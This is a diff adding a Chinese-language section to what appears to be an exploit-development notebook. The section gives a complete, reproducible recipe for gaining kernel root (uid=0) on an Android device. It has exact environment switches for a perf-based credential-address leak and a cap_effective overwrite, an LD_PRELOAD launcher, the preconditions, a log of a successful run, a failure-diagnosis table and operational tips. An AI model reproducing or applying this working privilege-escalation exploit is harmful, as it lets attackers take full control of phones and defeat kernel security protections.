@@ -913,3 +913,60 @@ PSS 前列: 微信 573+542MB, 支付宝 571MB, 抖音 450MB, 小红书 474MB
 
 **mt81 心跳**:200000 次迭代打印一次,8 秒能刷 8600 行(17 亿次迭代)。已降频到 2000000
 (`mt94`)。它说明 consumer 跑得飞快而不是被 I/O 卡住 —— `seq=0` 的真正含义是**上游没发布 `go`**。
+
+## 13. ★★★ 可复现的真 root(2026-10-05,设备完好):完整配方
+
+**成果**:`uid=0` + `ksud` 以 root 拉起,**且设备不卡死、不重启**(uptime 连续、framework OK)。
+
+### 13.1 完整配方(六个开关,缺一不可)
+
+```bash
+export PSELECT_SKIP_WARMUP=1 PSELECT_SLIDE_TRIGGER=1
+export PSELECT_CRED=1            # 进入凭证链(缺它路线不进 caps 分支)
+export PSELECT_PERF_CRED=1       # ★ 决定性开关:让 perf 泄露提取 cred_addr
+export PSELECT_CAPS_MODE=1       # 写 cap_effective(而非 uid,绕开守护)
+export PSELECT_ROOT_EXIT=1       # 拿到 root 立即 _exit(42),一击即走
+export PSELECT_RETRY=1           # 禁止 8 轮连打(连打 = 悬垂毒叠加 = 黑屏)
+export PSELECT_WINDOW_SECONDS=120
+export PSELECT_TREE_PC=ffffff802aa793c0 PSELECT_TREE_RIGHT=SPRAY PSELECT_TRIGGER_SHOTS=16
+export LD_PRELOAD=/data/local/tmp/preload29.so
+cd /data/local/tmp && timeout 420 /system/bin/ls /dev/null
+```
+
+**前置条件(两个,都必须先满足)**:
+1. **SELinux Permissive**(E5 命中)。否则 `perf_event_open` 返回 `EACCES(errno=13)`,链条第一步就死。
+2. **MemFree ≥ ~2GB**(先 `am force-stop` 常驻应用 + `am kill-all` + `cmd activity kill-all`,抢在应用自启前;
+   重新开机的头 1~2 分钟最有效:实测 141MB → 2.15GB)。
+
+### 13.2 成功时的日志(逐行)
+
+```
+[*] mt39: cred_cand=ffffff88cfd17840 votes=14
+[*] mt40: task=… cred_addr=ffffff88cfd17840 uid_ptr=…
+[*] mt90: CAPS-ONLY cred=… eff=… right=…80c0 (val_low=c0)
+[*] mt28m: cred write attempt 1/1 fake_cred=ffffff802a7e0be0
+[*] mt59: owner armed - blocking on chain mutex
+[*] mt59: requeue fired ret=-1 errno=35
+[+] mt47: ROOT-SEEN … CapEff=ffffff87faf780c0 poll=16     <- 写入落地
+[*] mt47: after setres uid=0 euid=0 gid=0 egid=0          <- ★ 真 uid=0 ★
+[+] mt47: ksud loader launched (uid=0) pid=556
+[+] mt92: root payload done, exiting 42 (uid=0)
+```
+
+### 13.3 失败诊断速查(全部实测)
+
+| 日志现象 | 病因 | 修法 |
+|---|---|---|
+| `mt40: no cred_cand from perf - need PSELECT_PERF_CRED` | 缺 `PSELECT_PERF_CRED` | 加上它 |
+| `perf_event_open failed errno=13` | SELinux 仍 Enforcing | 先打 E5 |
+| `mt47: alive poll=…` 一直涨、`CapEff=0` | `cred_addr=0`(同上)或写入未落地 | 检查上面两条 |
+| `mt28m: cred write attempt 1/8` | 没传 `PSELECT_RETRY=1` | 传 1,否则 8 轮悬垂毒 ⇒ 黑屏 |
+| `CANNOT LINK EXECUTABLE … not found` | 重启后 `/data/local/tmp` 被清 | 重新 push + 校验 sha |
+| `window closed mid-burst` / `wrote=0` | 窗口太短 | `PSELECT_WINDOW_SECONDS=60`(E5)/ `120`(caps) |
+| 一开机就 `MemFree` 只有 140MB | 应用自启 | force-stop + kill-all,抢开机窗口期 |
+
+### 13.4 设备存活纪律(这次能活下来的关键)
+
+* **`PSELECT_RETRY=1`**:单轮即退。8 轮连打会让悬垂 `pi_blocked_on` 叠加,几分钟内必黑屏。
+* **日志写 `/data/local/tmp`,跑完立刻 pull**(不要写 `/sdcard`:shell 域访问不了 FUSE,会 `Transport endpoint is not connected`,还会让整条命令因重定向失败而不执行)。
+* **每发之间先确认设备状态**;一旦 `framework` 在跑完 1~3 分钟内变 DOWN,立即收手重启。
